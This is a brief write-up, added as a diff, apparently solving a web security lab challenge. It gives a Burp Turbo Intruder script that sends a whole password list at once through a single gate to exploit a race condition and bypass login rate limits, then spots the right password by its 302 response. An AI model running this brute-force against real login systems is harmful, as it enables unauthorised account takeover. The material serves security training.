@@ -1,0 +1,19 @@
+
+in this chalange we use turbo intruder and send password list with Race Condition
+use this script in turbo intruder:
+
+def queueRequests(target, wordlists):
+    engine = RequestEngine(endpoint=target.endpoint,
+                           concurrentConnections=1,
+                           engine=Engine.BURP2)
+    passwords = wordlists.clipboard
+    for password in passwords:
+        engine.queue(target.req, password, gate='1')
+    engine.openGate('1')
+
+
+def handleResponse(req, interesting):
+    table.add(req)
+	
+	
+finally find password with 302 status code.
